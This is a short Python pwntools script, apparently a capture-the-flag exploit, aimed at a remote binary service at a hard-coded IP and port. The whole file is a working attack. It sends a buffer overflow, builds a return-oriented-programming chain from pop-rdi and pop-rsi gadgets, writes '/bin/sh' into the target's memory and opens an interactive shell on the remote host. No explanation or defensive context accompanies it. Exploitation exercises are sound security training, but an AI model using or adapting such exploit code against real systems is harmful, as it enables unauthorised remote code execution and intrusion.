from pwn import *

HOST = "110.10.147.109"
PORT = 17777
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('54.180.100.218',PORT)
raw_input()
s.recvuntil(">>")
s.sendline("3")
s.recvuntil("number!")
s.sendline(str(0x17f0))
s.send("A"*0x1000)
gadget1 = 0x00000000004026f3 # pop rdi ; ret
gadget2 = 0x00000000004026f1 # pop rsi ; pop r15 ; ret
dat = "A"*0x18
dat += p64(gadget1)
dat += p64(0)
dat += p64(gadget2)
dat += p64(0x0006040CA)
dat += p64(0x0)
dat += p64(0x00400B88)
dat += p64(gadget1)
dat += p64(0x0006040CA)
dat += p64(0x00400B70)
s.send(dat+"A"*(0x7f0-len(dat)))
s.recvuntil("Thank You :)")
s.send("/bin/sh\x00")
s.interactive()
